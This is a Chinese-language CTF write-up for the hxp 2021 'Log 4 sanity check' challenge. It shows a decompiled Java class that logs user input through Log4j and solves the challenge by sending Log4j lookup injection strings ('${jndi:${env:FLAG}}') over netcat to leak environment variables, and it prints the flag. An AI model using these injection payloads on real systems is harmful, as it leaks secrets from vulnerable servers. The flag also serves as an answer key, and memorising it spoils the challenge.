---
title: Misc - Log 4 sanity check
description: 2021 | HXPCTF | MSC
---

## 题目

[ALARM ALARM](https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&v=6)

`nc 65.108.176.77 1337`

## 解题思路

- 恰逢近期在修补 Log4j 相关的漏洞（CVE-2021-44228） ΣΣΣ(Φ ωΦ||¡)
- Log4j 除了能够记录文本外，还可以使用简单表达式记录动态内容，[Log4j – Log4j 2 Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)
- 使用 Java Decompiler 查看 `Vuln.class` 代码。注意到当输入不包含 `dragon` 或 `hxp` 时，会使用到 `logger`，为漏洞点

    ```java
    import java.util.Scanner;
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;

    public class Vuln {
        public static void main(String[] paramArrayOfString) {
            try {
                Logger logger = LogManager.getLogger(Vuln.class);
                System.out.println("What is your favourite CTF?");
                String str = (new Scanner(System.in)).next();
                if (str.toLowerCase().contains("dragon")) {
                    System.out.println("<3");
                    System.exit(0);
                } 
                if (str.toLowerCase().contains("hxp")) {
                    System.out.println(":)");
                } else {
                    System.out.println(":(");
                    logger.error("Wrong answer: {}", str);
                } 
            } catch (Exception exception) {
                System.err.println(exception);
            } 
        }
    }
    ```

- 找到了漏洞点，可以简单地测试一下

    ```bash
    $ nc 65.108.176.77 1337
    What is your favourite CTF?
    ${jndi:${java:os}}       
    :(
    2021-12-20 03:01:29,326 main WARN Error looking up JNDI resource [Linux 5.10.0-9-amd64 unknown, architecture: amd64-64]. javax.naming.NoInitialContextException: Need to specify class name in environment or system property, or in an application resource file: java.naming.factory.initial
    ...
    ```

- 那么 Flag 在哪里呢？看看 `Dockerfile`，发现 Flag 已经写到环境变量里了！

    ```bash
    CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"
    ```

- 那么接下来就很简单了~利用 Environment Lookup 就可以轻松拿到 Flag：`hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}`

    ```bash
    $ nc 65.108.176.77 1337
    What is your favourite CTF?
    ${jndi:${env:FLAG}}
    :(
    2021-12-20 03:18:44,730 main WARN Error looking up JNDI resource [hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}]. javax.naming.NoInitialContextException: Need to specify class name in environment or system property, or in an application resource file: java.naming.factory.initial
    ```